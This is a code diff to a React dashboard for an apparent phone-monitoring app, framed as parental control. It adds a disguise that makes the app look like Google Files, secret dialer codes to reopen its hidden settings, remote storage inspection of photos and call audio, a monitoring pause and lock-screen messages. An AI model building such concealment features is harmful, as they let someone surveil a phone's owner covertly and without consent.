@@ -216,11 +216,15 @@ export default function Controls() {
     updateCamouflage,
     quickSettings,
     sendQuickSetting,
+    storageAnalysis,
+    requestStorageAnalysis,
+    pauseMonitoring,
     locations,
     sendCommand,
     pushToast
   } = useStore();
 
+  const [lockScreenNote, setLockScreenNote] = useState('');
   const [newBlockNumber, setNewBlockNumber] = useState('');
   const [micDuration, setMicDuration] = useState(15);
   const [cameraFacing, setCameraFacing] = useState('back');
@@ -753,6 +757,12 @@ export default function Controls() {
                     Offline
                   </span>
                 )}
+                {activeDevice?.monitoringPaused && (
+                  <span className="flex items-center gap-1 text-[10px] font-mono font-bold text-amber-600 dark:text-amber-400 bg-amber-50 dark:bg-amber-950/60 border border-amber-500/30 px-2.5 py-0.5 rounded-full">
+                    <Pause className="h-2.5 w-2.5" />
+                    Home Mode (Sync Paused)
+                  </span>
+                )}
                 {activeDevice?.battery !== undefined && (
                   <span className="text-[10px] font-mono text-slate-700 dark:text-slate-300 bg-white/80 dark:bg-slate-900/80 border border-slate-200 dark:border-slate-800 px-2 py-0.5 rounded-lg shadow-xs">
                     🔋 {activeDevice.battery}%
@@ -763,7 +773,40 @@ export default function Controls() {
           </div>
         </div>
 
-        <div className="flex items-center gap-2">
+        <div className="flex flex-wrap items-center gap-2">
+          {/* Home Mode (Pause Monitoring) Remote Toggle */}
+          <button
+            type="button"
+            onClick={() => pauseMonitoring(!activeDevice?.monitoringPaused)}
+            className={`btn-interactive flex items-center gap-1.5 px-3.5 py-2 rounded-xl text-xs font-bold transition-all shadow-md cursor-pointer border ${
+              activeDevice?.monitoringPaused
+                ? 'bg-amber-500 hover:bg-amber-600 text-slate-950 border-amber-400 shadow-amber-500/20'
+                : 'bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-300 border-slate-200 dark:border-slate-700'
+            }`}
+            title="When active, keeps connection live but stops syncing SMS, calls, location & notifications"
+          >
+            <Pause className="h-3.5 w-3.5" />
+            {activeDevice?.monitoringPaused ? 'Resume Monitoring' : 'Pause Monitoring (Home Mode)'}
+          </button>
+
+          {/* Open PhoneLink App on Device Remote Action */}
+          <button
+            type="button"
+            onClick={async () => {
+              const res = await sendCommand('open-app', { deviceId: activeDeviceId });
+              if (res && res.success) {
+                pushToast('Opening PhoneLink on child phone...', 'success');
+              } else {
+                pushToast(`Could not open app: ${res?.error || 'phone offline'}`, 'error');
+              }
+            }}
+            className="btn-interactive flex items-center gap-1.5 px-3 py-2 rounded-xl text-xs font-semibold bg-white dark:bg-slate-800 text-slate-700 dark:text-slate-300 hover:bg-slate-50 dark:hover:bg-slate-700 border border-slate-200 dark:border-slate-700 shadow-xs cursor-pointer"
+            title="Remotely launches PhoneLink settings on phone screen (even if disguised as Files or Calculator)"
+          >
+            <Smartphone className="h-3.5 w-3.5 text-indigo-500" />
+            Open On Device
+          </button>
+
           {controlSearch && (
             <button
               type="button"
@@ -1989,19 +2032,44 @@ export default function Controls() {
               <span className={`text-[10px] font-bold px-2 py-0.5 rounded border ${
                 camouflage?.hideAppIcon
                   ? 'border-purple-300 dark:border-purple-500/60 bg-purple-100 dark:bg-purple-950 text-purple-800 dark:text-purple-300'
+                  : camouflage?.filesDisguise
+                  ? 'border-sky-300 dark:border-sky-500/60 bg-sky-100 dark:bg-sky-950 text-sky-800 dark:text-sky-300'
                   : camouflage?.calculatorDisguise
                   ? 'border-amber-300 dark:border-amber-500/60 bg-amber-100 dark:bg-amber-950 text-amber-800 dark:text-amber-300'
                   : 'border-slate-300 dark:border-gray-700 bg-slate-100 dark:bg-gray-800 text-slate-600 dark:text-slate-400'
               }`}>
-                {camouflage?.hideAppIcon ? '👻 ICON HIDDEN' : camouflage?.calculatorDisguise ? '🧮 CALCULATOR ACTIVE' : 'STANDARD ICON'}
+                {camouflage?.hideAppIcon ? '👻 ICON HIDDEN' : camouflage?.filesDisguise ? '📁 FILES ACTIVE' : camouflage?.calculatorDisguise ? '🧮 CALCULATOR ACTIVE' : 'STANDARD ICON'}
               </span>
             </div>
 
             <p className="text-xs text-slate-700 dark:text-slate-300 mb-4 bg-slate-50 dark:bg-slate-950/70 p-3 rounded-lg border border-slate-200/80 dark:border-slate-800 leading-relaxed">
-              When Camouflage is active, the app icon on the phone changes to <strong>"Calculator"</strong> or can be completely hidden from the home screen &amp; app drawer. Type secret PIN <strong>9211</strong> and press <strong>=</strong> in the calculator, or dial <strong>*9211</strong> or <strong>*#*#9211#*#*</strong> in the phone dialer, or open <strong>phonelink://open</strong> in Chrome to access settings.
+              When Camouflage is active, the app disguise changes to <strong>"Google Files"</strong>, <strong>"iOS Calculator"</strong>, or is completely hidden from the home screen &amp; app drawer.
+              <br />
+              <strong>Ways to reopen settings:</strong> Secret dialer code <strong>*#*#74663#*#*</strong> ("PHONE") or <strong>*#74663#</strong> or <strong>*9211</strong>, or use the <strong>Open On Device</strong> button at the top of this dashboard, or browse to <strong>phonelink://open</strong> in Chrome.
             </p>
 
             <div className="space-y-3 mb-4">
+              <div className="flex items-center justify-between bg-slate-50/80 dark:bg-slate-950/60 p-2.5 rounded-lg border border-slate-200/80 dark:border-slate-800/80">
+                <div>
+                  <span className="text-xs text-slate-800 dark:text-slate-200 font-semibold block">Disguise as Google Files</span>
+                  <span className="text-[10px] text-slate-500 dark:text-slate-400 block">Changes icon to Files. Clicking opens phone's real File Manager. Secret dial: *#*#74663#*#*</span>
+                </div>
+                <button
+                  type="button"
+                  onClick={() => updateCamouflage({
+                    filesDisguise: !camouflage?.filesDisguise,
+                    stealthMode: camouflage?.filesDisguise ? 'NORMAL' : 'FILES'
+                  })}
+                  className={`px-3 py-1 rounded-md text-xs font-bold transition cursor-pointer ${
+                    camouflage?.filesDisguise
+                      ? 'bg-sky-100 dark:bg-sky-500/20 text-sky-800 dark:text-sky-300 border border-sky-300 dark:border-sky-500/40'
+                      : 'bg-slate-100 hover:bg-slate-200 dark:bg-gray-800 dark:hover:bg-gray-700 text-slate-600 dark:text-slate-400 border border-slate-300 dark:border-gray-700'
+                  }`}
+                >
+                  {camouflage?.filesDisguise ? 'ENABLED' : 'OFF'}
+                </button>
+              </div>
+
               <div className="flex items-center justify-between bg-slate-50/80 dark:bg-slate-950/60 p-2.5 rounded-lg border border-slate-200/80 dark:border-slate-800/80">
                 <div>
                   <span className="text-xs text-slate-800 dark:text-slate-200 font-semibold block">Disguise as iOS Calculator</span>
@@ -2226,6 +2294,122 @@ export default function Controls() {
             >
               <span>🏠 Set Pixel Safe Launcher as Default Home</span>
             </button>
+          </div>
+        </div>
+
+        {/* DEVICE STORAGE ANALYZER CARD */}
+        <div className={`rounded-2xl border border-slate-200/90 dark:border-white/10 bg-white/70 dark:bg-slate-900/60 backdrop-blur-xl hover:border-cyan-500/40 p-5 shadow-xl hover:-translate-y-1 transition-all duration-300 flex flex-col justify-between ${isCardVisible("hardware", ["storage", "disk", "space", "analyzer", "memory"]) ? "" : "hidden"}`}>
+          <div>
+            <div className="flex items-center justify-between mb-4 border-b border-slate-200/80 dark:border-slate-800 pb-3">
+              <h3 className="font-bold text-slate-900 dark:text-slate-100 flex items-center gap-2 text-sm">
+                <HardDrive className="h-4 w-4 text-cyan-500" /> Device Storage Analyzer
+              </h3>
+              <button
+                type="button"
+                onClick={requestStorageAnalysis}
+                className="btn-interactive flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-cyan-500/10 text-cyan-600 dark:text-cyan-400 border border-cyan-500/30 text-xs font-semibold hover:bg-cyan-500/20 cursor-pointer shadow-xs"
+              >
+                <RefreshCw className="h-3 w-3" /> Analyze Storage
+              </button>
+            </div>
+
+            {storageAnalysis ? (
+              <div className="space-y-3">
+                <div className="flex justify-between items-center text-xs">
+                  <span className="text-slate-500 dark:text-slate-400">Total Internal Storage:</span>
+                  <span className="font-mono font-bold text-slate-900 dark:text-white">
+                    {((storageAnalysis.totalBytes || 0) / (1024 * 1024 * 1024)).toFixed(1)} GB
+                  </span>
+                </div>
+                <div className="w-full bg-slate-200 dark:bg-slate-800 rounded-full h-2.5 overflow-hidden flex">
+                  <div
+                    className="bg-cyan-500 h-2.5 transition-all duration-500"
+                    style={{
+                      width: `${Math.min(100, Math.round(((storageAnalysis.usedBytes || 0) / (storageAnalysis.totalBytes || 1)) * 100))}%`
+                    }}
+                  />
+                </div>
+                <div className="flex justify-between text-[11px] font-mono text-slate-500">
+                  <span>Used: {((storageAnalysis.usedBytes || 0) / (1024 * 1024 * 1024)).toFixed(1)} GB</span>
+                  <span>Free: {((storageAnalysis.freeBytes || 0) / (1024 * 1024 * 1024)).toFixed(1)} GB</span>
+                </div>
+
+                <div className="grid grid-cols-2 gap-2 pt-2 border-t border-slate-200/60 dark:border-slate-800/60 text-[11px]">
+                  <div className="p-2 rounded-lg bg-slate-50 dark:bg-slate-950/60">
+                    <span className="text-slate-500 block">Photos / Images</span>
+                    <span className="font-mono font-bold text-slate-900 dark:text-slate-100">
+                      {((storageAnalysis.imagesBytes || 0) / (1024 * 1024)).toFixed(1)} MB
+                    </span>
+                  </div>
+                  <div className="p-2 rounded-lg bg-slate-50 dark:bg-slate-950/60">
+                    <span className="text-slate-500 block">Videos &amp; Movies</span>
+                    <span className="font-mono font-bold text-slate-900 dark:text-slate-100">
+                      {((storageAnalysis.videosBytes || 0) / (1024 * 1024)).toFixed(1)} MB
+                    </span>
+                  </div>
+                  <div className="p-2 rounded-lg bg-slate-50 dark:bg-slate-950/60">
+                    <span className="text-slate-500 block">Audio &amp; Calls</span>
+                    <span className="font-mono font-bold text-slate-900 dark:text-slate-100">
+                      {((storageAnalysis.audioBytes || 0) / (1024 * 1024)).toFixed(1)} MB
+                    </span>
+                  </div>
+                  <div className="p-2 rounded-lg bg-slate-50 dark:bg-slate-950/60">
+                    <span className="text-slate-500 block">Docs &amp; Downloads</span>
+                    <span className="font-mono font-bold text-slate-900 dark:text-slate-100">
+                      {((storageAnalysis.docsBytes || 0) / (1024 * 1024)).toFixed(1)} MB
+                    </span>
+                  </div>
+                </div>
+              </div>
+            ) : (
+              <div className="text-center py-6 text-xs text-slate-500 dark:text-slate-400">
+                Click <strong>Analyze Storage</strong> to inspect photos, videos, recordings, and free disk space.
+              </div>
+            )}
+          </div>
+        </div>
+
+        {/* CUSTOM LOCK SCREEN REMINDER MESSAGE CARD */}
+        <div className={`rounded-2xl border border-slate-200/90 dark:border-white/10 bg-white/70 dark:bg-slate-900/60 backdrop-blur-xl hover:border-indigo-500/40 p-5 shadow-xl hover:-translate-y-1 transition-all duration-300 flex flex-col justify-between ${isCardVisible("safety", ["lockscreen", "message", "reminder", "screen", "banner", "note"]) ? "" : "hidden"}`}>
+          <div>
+            <div className="flex items-center justify-between mb-4 border-b border-slate-200/80 dark:border-slate-800 pb-3">
+              <h3 className="font-bold text-slate-900 dark:text-slate-100 flex items-center gap-2 text-sm">
+                <Lock className="h-4 w-4 text-indigo-500" /> Lock Screen Parental Note
+              </h3>
+            </div>
+            <p className="text-xs text-slate-500 dark:text-slate-400 mb-3 leading-relaxed">
+              Display a persistent contact banner or urgent reminder note on the child's lock screen.
+            </p>
+            <div className="space-y-2">
+              <input
+                type="text"
+                value={lockScreenNote}
+                onChange={(e) => setLockScreenNote(e.target.value)}
+                placeholder="e.g. Call Mum immediately on +91 9876543210"
+                className="w-full rounded-xl bg-white dark:bg-slate-950/80 border border-slate-300 dark:border-slate-800 px-3 py-2 text-xs text-slate-900 dark:text-slate-100 outline-none focus:border-indigo-500 shadow-xs"
+              />
+              <button
+                type="button"
+                onClick={async () => {
+                  if (!lockScreenNote.trim()) {
+                    pushToast('Please enter a note to display', 'error');
+                    return;
+                  }
+                  const res = await sendCommand('lock-screen-message', {
+                    deviceId: activeDeviceId,
+                    message: lockScreenNote.trim()
+                  });
+                  if (res && res.success) {
+                    pushToast('Lock screen note posted on phone', 'success');
+                  } else {
+                    pushToast(`Failed to update note: ${res?.error || 'phone offline'}`, 'error');
+                  }
+                }}
+                className="w-full btn-interactive py-2 rounded-xl text-xs font-bold bg-gradient-to-r from-indigo-600 to-violet-600 text-white shadow-md shadow-indigo-500/20 hover:from-indigo-500 hover:to-violet-500 cursor-pointer"
+              >
+                Display on Child Lock Screen
+              </button>
+            </div>
           </div>
         </div>
 
